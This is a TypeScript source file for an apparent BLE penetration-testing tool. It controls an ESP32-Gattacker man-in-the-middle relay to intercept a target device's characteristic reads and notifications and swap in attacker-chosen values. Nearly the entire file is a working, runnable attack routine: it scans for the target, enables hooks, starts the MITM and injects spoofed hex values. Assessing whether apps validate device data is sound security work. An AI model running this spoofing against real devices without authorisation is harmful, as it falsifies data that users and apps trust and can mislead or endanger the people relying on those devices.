/**
 * spoof-notifications.ts — Notification spoofing/injection (Flow 3.8)
 *
 * Uses ESP32-Gattacker MITM relay to intercept and modify BLE notification
 * values sent from the target device to the victim. Tests whether the
 * victim app validates notification data or blindly trusts it.
 * Online: requires ESP32-Gattacker hardware (ESP32-S3) on WiFi
 */

import { z } from 'zod';
import { fileURLToPath } from 'node:url';
import { BleMacAddressSchema, estimateTokens } from './lib/types.js';
import type { IGattackerClient } from './mitm-relay.js';

export const spoofNotificationsParams = z.object({
  target_mac: BleMacAddressSchema,
  gattacker_url: z.string().default('ws://1.3.3.7/ws'),
  spoofed_values: z
    .array(
      z.object({
        uuid: z.string().min(4),
        original_pattern: z.string().optional(),
        spoofed_value_hex: z.string().regex(/^[0-9a-fA-F]+$/),
        description: z.string().optional(),
      }),
    )
    .min(1),
  capture_duration_seconds: z.number().min(0).max(3600).default(30),
});
export type SpoofNotificationsInput = z.infer<typeof spoofNotificationsParams>;

interface SpoofEvent {
  timestamp: string;
  uuid: string;
  original_value_hex: string;
  spoofed_value_hex: string;
  delivered: boolean;
}

export const spoofNotifications = {
  name: 'caeruleus.spoof_notifications',
  description:
    'Spoof BLE notification values via ESP32-Gattacker MITM relay. Intercepts read responses from the target device and replaces them with attacker-controlled values to test victim app data validation.',
  parameters: spoofNotificationsParams,

  async execute(
    input: SpoofNotificationsInput,
    wsClient?: IGattackerClient,
  ): Promise<Record<string, unknown>> {
    const validated = spoofNotificationsParams.parse(input);
    const findings: Array<Record<string, unknown>> = [];
    const spoofEvents: SpoofEvent[] = [];
    const stateLog: Array<Record<string, unknown>> = [];

    // Build spoofing lookup: uuid -> spoofed value
    const spoofMap = new Map<
      string,
      { spoofed_value_hex: string; original_pattern?: string; description?: string }
    >();
    for (const sv of validated.spoofed_values) {
      spoofMap.set(sv.uuid.toLowerCase(), sv);
    }

    const client = wsClient ?? (await createWsClient(validated.gattacker_url));

    const messageQueue: Array<Record<string, unknown>> = [];
    let messageResolver: ((msg: Record<string, unknown>) => void) | null = null;

    client.onMessage((msg) => {
      // Intercept read responses — this is where we spoof notification data
      if (msg.onRead) {
        const uuid = (msg.uuid as string).toLowerCase();
        const spoofRule = spoofMap.get(uuid);

        if (spoofRule) {
          // Replace the value with our spoofed value
          const event: SpoofEvent = {
            timestamp: new Date().toISOString(),
            uuid,
            original_value_hex: msg.value as string,
            spoofed_value_hex: spoofRule.spoofed_value_hex,
            delivered: true,
          };
          spoofEvents.push(event);

          client.send({
            opt: 2,
            action: 'hookret',
            hook_ret: spoofRule.spoofed_value_hex,
          });
          return;
        }

        // Pass through unmodified for non-target UUIDs
        client.send({
          opt: 2,
          action: 'hookret',
          hook_ret: msg.value as string,
        });
        return;
      }

      // Also intercept writes (pass through unmodified)
      if (msg.onWrite) {
        client.send({
          opt: 2,
          action: 'hookret',
          hook_ret: msg.value as string,
        });
        return;
      }

      // Queue state/result messages
      if (messageResolver) {
        messageResolver(msg);
        messageResolver = null;
      } else {
        messageQueue.push(msg);
      }
    });

    function waitForMessage(
      predicate: (msg: Record<string, unknown>) => boolean,
      timeoutMs: number,
    ): Promise<Record<string, unknown>> {
      const idx = messageQueue.findIndex(predicate);
      if (idx >= 0) {
        return Promise.resolve(messageQueue.splice(idx, 1)[0]);
      }

      return new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
          messageResolver = null;
          reject(new Error('Gattacker response timeout'));
        }, timeoutMs);

        const checkMsg = (msg: Record<string, unknown>) => {
          if (predicate(msg)) {
            clearTimeout(timer);
            resolve(msg);
          } else {
            messageQueue.push(msg);
            messageResolver = checkMsg;
          }
        };
        messageResolver = checkMsg;
      });
    }

    try {
      // Step 1: Scan for target
      client.send({ opt: 2, action: 'scan' });
      await waitForMessage((m) => m.scan_done === true, 15000);
      stateLog.push({ step: 'scan_complete' });

      // Step 2: Get results and verify target
      client.send({ opt: 2, action: 'results' });
      const resultsMsg = await waitForMessage((m) => 'results' in m, 5000);
      const devices = (resultsMsg.results || []) as Array<Record<string, unknown>>;

      const target = devices.find(
        (d) =>
          (d.mac as string).toUpperCase() === validated.target_mac.toUpperCase(),
      );

      if (!target) {
        client.close();
        const result = {
          schema_version: '1.0',
          target_mac: validated.target_mac,
          target_found: false,
          spoof_events: [],
          findings: [{
            finding_id: 'F-atk-spoof-target-not-found',
            type: 'spoof_target_not_found',
            severity: 'informational',
            description: `Target ${validated.target_mac} not found`,
          }],
          findings_count: 1,
          estimatedTokens: 0,
        };
        result.estimatedTokens = estimateTokens(result);
        return result;
      }

      // Step 3: Enable hooks (required for spoofing)
      client.send({ opt: 2, action: 'enable_hooks', enable: true });
      await waitForMessage((m) => 'hooks_enabled' in m, 5000);
      stateLog.push({ step: 'hooks_enabled' });

      // Step 4: Start MITM attack
      client.send({ opt: 2, action: 'start', mac: validated.target_mac });
      await waitForMessage((m) => 'state' in m, 10000);
      stateLog.push({ step: 'attack_started' });

      // Step 5: Capture and spoof for duration
      await new Promise((resolve) =>
        setTimeout(resolve, validated.capture_duration_seconds * 1000),
      );

      // Step 6: Stop
      client.send({ opt: 2, action: 'stop' });
      await waitForMessage((m) => 'state' in m && m.state === 0, 10000);
      stateLog.push({ step: 'attack_stopped' });

      // Analyze spoofing results
      if (spoofEvents.length > 0) {
        const affectedUuids = [...new Set(spoofEvents.map((e) => e.uuid))];

        findings.push({
          finding_id: 'F-atk-spoof-success',
          type: 'notification_spoofing_success',
          severity: 'high',
          description: `Successfully spoofed ${spoofEvents.length} notification values across ${affectedUuids.length} characteristics`,
          affected_uuids: affectedUuids,
          total_spoofed: spoofEvents.length,
        });

        // Per-UUID findings
        for (const uuid of affectedUuids) {
          const uuidEvents = spoofEvents.filter((e) => e.uuid === uuid);
          const rule = spoofMap.get(uuid);
          findings.push({
            finding_id: `F-atk-spoof-${uuid.slice(-4)}`,
            type: 'spoofed_characteristic',
            severity: 'high',
            uuid,
            description: rule?.description || `Spoofed ${uuidEvents.length} read responses on ${uuid}`,
            times_spoofed: uuidEvents.length,
            spoofed_value: rule?.spoofed_value_hex,
          });
        }
      } else {
        findings.push({
          finding_id: 'F-atk-spoof-no-reads',
          type: 'no_reads_intercepted',
          severity: 'informational',
          description: 'No read operations were intercepted during capture window. Target characteristics may not have been accessed.',
        });
      }
    } finally {
      client.close();
    }

    const result = {
      schema_version: '1.0',
      target_mac: validated.target_mac,
      target_found: true,
      gattacker_url: validated.gattacker_url,
      capture_duration_seconds: validated.capture_duration_seconds,
      spoofed_characteristics: validated.spoofed_values.length,
      spoof_events: spoofEvents,
      spoof_event_count: spoofEvents.length,
      state_log: stateLog,
      findings,
      findings_count: findings.length,
      estimatedTokens: 0,
    };

    result.estimatedTokens = estimateTokens(result);
    return result;
  },
};

async function createWsClient(url: string): Promise<IGattackerClient> {
  const { WebSocket } = await import('ws');
  const ws = new WebSocket(url);

  await new Promise<void>((resolve, reject) => {
    ws.on('open', resolve);
    ws.on('error', reject);
    setTimeout(() => reject(new Error('WebSocket connection timeout')), 10000);
  });

  let handler: ((msg: Record<string, unknown>) => void) | null = null;

  ws.on('message', (data: Buffer) => {
    try {
      const msg = JSON.parse(data.toString());
      if (handler) handler(msg);
    } catch {
      // Ignore non-JSON messages
    }
  });

  return {
    send(msg) {
      ws.send(JSON.stringify(msg));
    },
    onMessage(h) {
      handler = h;
    },
    close() {
      ws.close();
    },
  };
}

const isMain = process.argv[1] === fileURLToPath(import.meta.url);
if (isMain) {
  const input = JSON.parse(process.argv[2] ?? '{}');
  spoofNotifications
    .execute(input)
    .then((r) => console.log(JSON.stringify(r, null, 2)))
    .catch((e: unknown) => {
      console.error(JSON.stringify({ error: (e as Error).message }, null, 2));
      process.exit(1);
    });
}
